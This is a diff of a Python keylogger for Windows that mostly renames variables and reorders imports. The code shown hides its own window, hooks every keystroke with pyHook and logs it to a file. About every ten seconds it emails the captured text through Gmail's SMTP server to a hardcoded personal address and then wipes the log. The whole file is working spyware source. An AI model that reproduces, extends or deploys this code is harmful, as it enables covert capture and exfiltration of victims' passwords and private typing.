@@ -1,14 +1,15 @@
 import win32gui
 import win32con
-import pyHook
+import time
+import smtplib
 import pythoncom
 import logging as logger
-import smtplib
-import time
+import pyHook
 
-# hides the keylogger while it is running-does not open a console window
-hide = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
+# hides the keylogger
+foreground_window = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(foreground_window, win32con.SW_HIDE)
 
 GMAIL_SERVER = 'smtp.gmail.com:587'
 PROJECT_MAIL_ADDRESS = 'danacohentalbaum@gmail.com'
@@ -28,16 +29,16 @@ def OnKeyboardEvent(typed_char):
     :param typed_char:
     :return: True - the keyboard event was caught.
     """
-    global sending_time
+    global email_send_time
     logger.basicConfig(filename=LOGGER_FILENAME, level=LOGGER_LEVEL, format=LOGGER_FORMAT)
     logger.log(LOGGER_LEVEL_NUMBER, chr(typed_char.Ascii))
 
     # if the a mail was sent more than 10 seconds ago, send mail
-    if passed_enough_time_since_last_email(sending_time):
+    if passed_enough_time_since_last_email(email_send_time):
         file = open(LOGGER_FILENAME, 'r+')
         parsed_content = (parse_input_file(file))
         send_mail(parsed_content)
-        sending_time = time.time()
+        email_send_time = time.time()
         delete_old_file_content(file)
     return True
 
@@ -86,12 +87,11 @@ def send_mail(message):
     server.quit()
 
 
-
-sending_time = time.time()
-# start logging keys
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-hooks_manager.HookKeyboard()
+email_send_time = time.time()
+# key logger init
+keylogger = pyHook.HookManager()
+keylogger.KeyDown = OnKeyboardEvent
+keylogger.HookKeyboard()
 pythoncom.PumpMessages()
 
 
